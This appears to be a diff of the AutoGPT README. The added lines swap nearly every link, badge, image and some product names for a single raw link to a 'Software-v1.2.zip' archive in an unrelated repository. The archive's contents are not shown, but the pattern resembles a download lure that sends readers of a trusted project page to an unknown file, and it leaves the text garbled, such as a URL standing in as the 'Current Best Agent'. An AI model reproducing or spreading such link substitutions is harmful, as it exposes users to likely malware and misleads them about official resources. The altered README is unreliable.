@@ -1,8 +1,8 @@
 # AutoGPT: build & use AI agents
 
-[![Discord Follow](https://dcbadge.vercel.app/api/server/autogpt?style=flat)](https://discord.gg/autogpt) &ensp;
-[![Twitter Follow](https://img.shields.io/twitter/follow/Auto_GPT?style=social)](https://twitter.com/Auto_GPT) &ensp;
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Discord Follow](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) &ensp;
+[![Twitter Follow](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) &ensp;
+[![License: MIT](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)
 
 **AutoGPT** is the vision of the power of AI accessible to everyone, to use and to build on. Our mission is to provide the tools, so that you can focus on what matters:
 
@@ -12,29 +12,29 @@
 
 Be part of the revolution! **AutoGPT** is here to stay, at the forefront of AI innovation.
 
-**📖 [Documentation](https://docs.agpt.co)**
+**📖 [Documentation](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)**
 &ensp;|&ensp;
-**🚀 [Contributing](CONTRIBUTING.md)**
+**🚀 [Contributing](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)**
 &ensp;|&ensp;
-**🛠️ [Build your own Agent - Quickstart](QUICKSTART.md)**
+**🛠️ [Build your own Agent - Quickstart](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)**
 
-## 🥇 Current Best Agent: evo.ninja
+## 🥇 Current Best Agent: https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip
 [Current Best Agent]: #-current-best-agent-evoninja
 
-The AutoGPT Arena Hackathon saw [**evo.ninja**](https://github.com/polywrap/evo.ninja) earn the top spot on our Arena Leaderboard, proving itself as the best open-source generalist agent. Try it now at https://evo.ninja!
+The AutoGPT Arena Hackathon saw [**https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip**](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) earn the top spot on our Arena Leaderboard, proving itself as the best open-source generalist agent. Try it now at https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip!
 
-📈 To challenge evo.ninja, AutoGPT, and others, submit your benchmark run to the [Leaderboard](#-leaderboard), and maybe your agent will be up here next!
+📈 To challenge https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip, AutoGPT, and others, submit your benchmark run to the [Leaderboard](#-leaderboard), and maybe your agent will be up here next!
 
 ## 🧱 Building blocks
 
 ### 🏗️ Forge
 
-**Forge your own agent!** &ndash; Forge is a ready-to-go template for your agent application. All the boilerplate code is already handled, letting you channel all your creativity into the things that set *your* agent apart. All tutorials are located [here](https://medium.com/@aiedge/autogpt-forge-e3de53cc58ec). Components from the [`forge.sdk`](/autogpts/forge/forge/sdk) can also be used individually to speed up development and reduce boilerplate in your agent project.
+**Forge your own agent!** &ndash; Forge is a ready-to-go template for your agent application. All the boilerplate code is already handled, letting you channel all your creativity into the things that set *your* agent apart. All tutorials are located [here](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip). Components from the [`https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip`](/autogpts/forge/forge/sdk) can also be used individually to speed up development and reduce boilerplate in your agent project.
 
-🚀 [**Getting Started with Forge**](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpts/forge/tutorials/001_getting_started.md) &ndash;
+🚀 [**Getting Started with Forge**](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) &ndash;
 This guide will walk you through the process of creating your own agent and using the benchmark and user interface.
 
-📘 [Learn More](https://github.com/Significant-Gravitas/AutoGPT/tree/master/autogpts/forge) about Forge
+📘 [Learn More](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) about Forge
 
 ### 🎯 Benchmark
 
@@ -42,16 +42,16 @@ This guide will walk you through the process of creating your own agent and usin
 
 <!-- TODO: insert visual demonstrating the benchmark -->
 
-📦 [`agbenchmark`](https://pypi.org/project/agbenchmark/) on Pypi
+📦 [`agbenchmark`](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) on Pypi
 &ensp;|&ensp;
-📘 [Learn More](https://github.com/Significant-Gravitas/AutoGPT/blob/master/benchmark) about the Benchmark
+📘 [Learn More](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) about the Benchmark
 
 #### 🏆 [Leaderboard][leaderboard]
-[leaderboard]: https://leaderboard.agpt.co
+[leaderboard]: https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip
 
 Submit your benchmark run through the UI and claim your place on the AutoGPT Arena Leaderboard! The best scoring general agent earns the title of **[Current Best Agent]**, and will be adopted into our repo so people can easily run it through the [CLI].
 
-[![Screenshot of the AutoGPT Arena leaderboard](https://github.com/Significant-Gravitas/AutoGPT/assets/12185583/60813392-9ddb-4cca-bb44-b477dbae225d)][leaderboard]
+[![Screenshot of the AutoGPT Arena leaderboard](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)][leaderboard]
 
 ### 💻 UI
 
@@ -61,7 +61,7 @@ Submit your benchmark run through the UI and claim your place on the AutoGPT Are
 
 The frontend works out-of-the-box with all agents in the repo. Just use the [CLI] to run your agent of choice!
 
-📘 [Learn More](https://github.com/Significant-Gravitas/AutoGPT/tree/master/frontend) about the Frontend
+📘 [Learn More](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) about the Frontend
 
 ### ⌨️ CLI
 
@@ -71,7 +71,7 @@ To make it as easy as possible to use all of the tools offered by the repository
 
 ```shell
 $ ./run
-Usage: cli.py [OPTIONS] COMMAND [ARGS]...
+Usage: https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip [OPTIONS] COMMAND [ARGS]...
 
 Options:
   --help  Show this message and exit.
@@ -87,22 +87,22 @@ Just clone the repo, install dependencies with `./run setup`, and you should be 
 
 ## 🤔 Questions? Problems? Suggestions?
 
-### Get help - [Discord 💬](https://discord.gg/autogpt)
+### Get help - [Discord 💬](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)
 
-[![Join us on Discord](https://invidget.switchblade.xyz/autogpt)](https://discord.gg/autogpt)
+[![Join us on Discord](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip)
 
-To report a bug or request a feature, create a [GitHub Issue](https://github.com/Significant-Gravitas/AutoGPT/issues/new/choose). Please ensure someone else hasn’t created an issue for the same topic.
+To report a bug or request a feature, create a [GitHub Issue](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip). Please ensure someone else hasn’t created an issue for the same topic.
 
 ## 🤝 Sister projects
 
 ### 🔄 Agent Protocol
 
-To maintain a uniform standard and ensure seamless compatibility with many current and future applications, AutoGPT employs the [agent protocol](https://agentprotocol.ai/) standard by the AI Engineer Foundation. This standardizes the communication pathways from your agent to the frontend and benchmark.
+To maintain a uniform standard and ensure seamless compatibility with many current and future applications, AutoGPT employs the [agent protocol](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) standard by the AI Engineer Foundation. This standardizes the communication pathways from your agent to the frontend and benchmark.
 
 ---
 
 <p align="center">
-  <a href="https://star-history.com/#Significant-Gravitas/AutoGPT&Date">
-    <img src="https://api.star-history.com/svg?repos=Significant-Gravitas/AutoGPT&type=Date" alt="Star History Chart">
+  <a href="https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip">
+    <img src="https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip" alt="Star History Chart">
   </a>
 </p>
